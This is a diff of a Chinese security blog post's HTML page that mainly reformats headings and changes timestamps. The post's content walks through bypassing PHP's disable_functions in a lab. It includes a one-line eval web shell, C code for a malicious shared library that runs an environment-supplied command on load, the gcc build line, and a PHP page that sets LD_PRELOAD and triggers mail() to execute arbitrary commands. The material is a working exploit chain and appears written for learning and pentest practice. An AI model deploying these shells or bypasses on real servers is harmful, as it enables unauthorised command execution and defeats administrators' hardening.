@@ -93,7 +93,7 @@
 <meta property="og:site_name" content="MaiKeFee|一个兴趣使然的信息安全爱好者">
 <meta property="og:description" content="前言无意中刷到一个文章，关于disablefunction的方法绕过的，依然是脚本小子式的复现环境。 我们也知道在渗透测试中经常会出现这种情况，写了shell，但是执行不了系统函数，这个时候不妨看看php的PHP info()，页面，通常就是函数被禁用，被禁用的话会很尴尬，因为自己种的马骑不了,所以这个时候就想办法绕过了。绕过的原理原理就是加上一个so文件啊，让执行系统函数的时候，默认执行我们做好">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-08-28T08:40:27.754Z">
+<meta property="og:updated_time" content="2019-08-28T08:44:03.640Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="「disablefunc绕过」一种绕过php disablefunc的方法复现">
 <meta name="twitter:description" content="前言无意中刷到一个文章，关于disablefunction的方法绕过的，依然是脚本小子式的复现环境。 我们也知道在渗透测试中经常会出现这种情况，写了shell，但是执行不了系统函数，这个时候不妨看看php的PHP info()，页面，通常就是函数被禁用，被禁用的话会很尴尬，因为自己种的马骑不了,所以这个时候就想办法绕过了。绕过的原理原理就是加上一个so文件啊，让执行系统函数的时候，默认执行我们做好">
@@ -357,7 +357,7 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-08-28T16:40:27+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2019-08-28T16:44:03+08:00">
                 2019-08-28
               </time>
             
@@ -446,19 +446,14 @@
 <h3 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h3><pre><code>disable_functions = system,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,</code></pre><p>然后重启apache2 服务器</p>
 <p>这样就能把system禁用了</p>
 <p>然后在网站的根目录上放一个shell.php</p>
-<pre><code>&lt;?php  @eval($_GET[&apos;fz41&apos;]);?&gt;</code></pre><p>###访问shell.php</p>
-<p>可以正常执行php的代码，不能执行系统函数。</p>
-<p>###测试访问</p>
-<pre><code>http://192.168.44.139/shell.php?fz41=phpinfo();</code></pre><p>可以看见phpinfo()的信息</p>
-<p>###访问</p>
-<pre><code>http://192.168.44.139/shell.php?fz41=system(ls);</code></pre><p>###没有任何回显</p>
-<p>环境配置成功，我们的任务就是通过劫持函数的方法来绕过这个disable_functions 的限制，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</p>
+<pre><code>&lt;?php  @eval($_GET[&apos;fz41&apos;]);?&gt;</code></pre><h3 id="访问shell-php"><a href="#访问shell-php" class="headerlink" title="访问shell.php"></a>访问shell.php</h3><p>可以正常执行php的代码，不能执行系统函数。</p>
+<h3 id="测试访问"><a href="#测试访问" class="headerlink" title="测试访问"></a>测试访问</h3><pre><code>http://192.168.44.139/shell.php?fz41=phpinfo();</code></pre><p>可以看见phpinfo()的信息</p>
+<h3 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h3><pre><code>http://192.168.44.139/shell.php?fz41=system(ls);</code></pre><h3 id="没有任何回显"><a href="#没有任何回显" class="headerlink" title="没有任何回显"></a>没有任何回显</h3><p>环境配置成功，我们的任务就是通过劫持函数的方法来绕过这个disable_functions 的限制，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</p>
 <p>原理解读<br>LD_PRELOAD的作用<br>LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime<br>linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的</p>
 <p>我们要做的就是通过修改环境变量LD_PRELOAD，让php启动新的进程的时候加载我们设置好的函数，比如说system()这样一来，就可以做到bypass了，只要启用了新的进程就有机会加载我们在上一个进程中构造的函数，通过测试可知mail可以创建新的进程，另外一个问题就是，如何构造我们想执行的函数，比如system()</p>
 <p>attribute((constructor))<br>GCC 有个 C 语言扩展修饰符 attribute__((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 __attribute((constructor)) 修饰的函数。</p>
 <p>因此，可以通过这个方式来构造函数，把我们要执行的命令放在环境变量里，执行时直接加载环境变量的命令，就可以做到绕过了</p>
-<p>####代码类似这种</p>
-<pre><code>#define _GNU_SOURCE
+<h4 id="代码类似这种"><a href="#代码类似这种" class="headerlink" title="代码类似这种"></a>代码类似这种</h4><pre><code>#define _GNU_SOURCE
 
 #include &lt;stdlib.h&gt;
 #include &lt;unistd.h&gt;
@@ -469,7 +464,10 @@ __attribute__ ((__constructor__)) void preloadme (void)
     const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);
     system(cmdline);
 }</code></pre><h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
-<p>复现<br>gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc2.so<br>然后写利用如下php</p>
+<p>复现<br>gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc2.so </p>
+<blockquote>
+<p>然后写利用如下php</p>
+</blockquote>
 <pre><code>&lt;?php
     echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc2.so  &lt;/p&gt;&quot;;
     $cmd = $_GET[&quot;cmd&quot;];
@@ -482,9 +480,8 @@ __attribute__ ((__constructor__)) void preloadme (void)
     mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);
     echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; 
     unlink($out_path);
-?&gt;</code></pre><p>#####然后访问</p>
-<p><a href="http://192.168.44.139/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/bypass_disablefunc2.so" target="_blank" rel="noopener">http://192.168.44.139/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/bypass_disablefunc2.so</a><br>参考链接<br><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></p>
-<p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a><br>来源:<a href="https://mp.weixin.qq.com/s/z98-KxxSeHVzHHssTLz-GQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/z98-KxxSeHVzHHssTLz-GQ</a></p>
+?&gt;</code></pre><h5 id="然后访问"><a href="#然后访问" class="headerlink" title="然后访问"></a>然后访问</h5><p><a href="http://192.168.44.139/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/bypass_disablefunc2.so" target="_blank" rel="noopener">http://192.168.44.139/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/bypass_disablefunc2.so</a><br>参考链接<br><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener"></a></p>
+<p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener"></a><br>来源:<a href="https://mp.weixin.qq.com/s/z98-KxxSeHVzHHssTLz-GQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/z98-KxxSeHVzHHssTLz-GQ</a></p>
 
       
     </div>
@@ -661,7 +658,7 @@ __attribute__ ((__constructor__)) void preloadme (void)
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.0.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#配置"><span class="nav-number">1.0.2.</span> <span class="nav-text">配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#设置"><span class="nav-number">1.0.3.</span> <span class="nav-text">设置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#工具使用"><span class="nav-number">1.0.4.</span> <span class="nav-text">工具使用</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.0.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#配置"><span class="nav-number">1.0.2.</span> <span class="nav-text">配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#设置"><span class="nav-number">1.0.3.</span> <span class="nav-text">设置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#访问shell-php"><span class="nav-number">1.0.4.</span> <span class="nav-text">访问shell.php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#测试访问"><span class="nav-number">1.0.5.</span> <span class="nav-text">测试访问</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#访问"><span class="nav-number">1.0.6.</span> <span class="nav-text">访问</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#没有任何回显"><span class="nav-number">1.0.7.</span> <span class="nav-text">没有任何回显</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#代码类似这种"><span class="nav-number">1.0.7.1.</span> <span class="nav-text">代码类似这种</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#工具使用"><span class="nav-number">1.0.8.</span> <span class="nav-text">工具使用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#然后访问"><span class="nav-number">1.0.8.0.1.</span> <span class="nav-text">然后访问</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
